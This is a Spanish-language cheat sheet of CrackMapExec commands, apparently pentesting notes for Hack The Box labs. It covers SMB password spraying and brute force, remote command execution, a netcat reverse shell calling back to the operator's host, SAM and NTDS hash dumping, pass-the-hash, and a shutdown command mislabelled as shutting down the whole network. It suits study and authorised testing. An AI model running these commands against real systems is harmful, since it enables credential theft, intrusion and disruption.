** Ejecutar CrackMapExec en un entorno python virtual **
>Nos colocamos sobre el directorio /opt/CrackMapExec.
>`pipenv shell`
>`cme smb 10.10.10.103 -u <usuario> -p <password>`

** Ejecutar CrackMapExec con Docker **
>`docker pull byt3bl33d3r/crackmapexec`

** Comprobar credenciales con CrackMapExec **
Sobre el protocolo SMB probamos credenciales
`cme smb <ip_objetivo> -u '<usuario>' -p '<contraseña>' -d 'active.htb'`

** Password Spraying **
`crackmapexec smb 10.10.10.228 -u users.txt -p '<contraseña>'`
`crackmapexec smb 10.10.10.228 -u users.txt -p users.txt`

** Fuerza bruta sobre un usuario para identificar password (Password spraying) **
```
cme smb  10.10.10.100 -u 'SVC_TGS' -p password.txt -d 'active.htb'
```

** Escaneo sobre el servicio SMB **
`cme smb <ip_objetivo>`

** Ejecutar comandos con credenciales con CME **
>Obtener usuario
>`cme smb <ip_objetivo> -u '<usuario>' -p '<contraseña>' -x 'whoami'`
>Apagar todos los equipos de la red
>`cme smb <ip_objetivo> -u '<usuario>' -p '<contraseña>' -x 'shutdown /r'`
>Activar RDP
>`cme smb <ip_objetivo> -u '<usuario>' -p '<contraseña>' -M rdp -o action=enable`

** Obtener una shell inversa pasándole primero el binario nc.exe **
>Montar servidor SMB en máquina local con Impacket
>`impacket-smbserver smbFolder $(pwd)`
>Ejecutamos comando en máquina Windows objetivo pasándole el binario nc.exe
>`cme smb <ip_objetivo> -u '<usuario>' -p '<contraseña>' -x '\\<own_ip>\smbFolder\nc.exe' -e cmd <own_ip> 443`

** Obtener las contraseñas de los usuarios a través del fichero SAM **
>SAM (Security Account Manager) de Windows, almacena las contraseñas
>Provee todos los usuarios del sistema y sus contraseñas hasheadas
>El usuario que hace la consulta debe ser del grupo Administrators
>`cme smb <ip_objetivo> -u '<usuario>' -p '<contraseña>' --sam` 

** Obtener todos los hashes de todos los usuarios ** 
`crackmapexec smb 10.10.10.100 -u 's4vitar' -p 's4vitar123' -d 'active.htb' --ntds vss`

** Pass the hash con CME **
El usuario debe estar en el grupo Administrators
`cme smb <ip_objetivo> -u '<usuario>' -H '<LM_hash:NT_hash' -x 'whoami'`

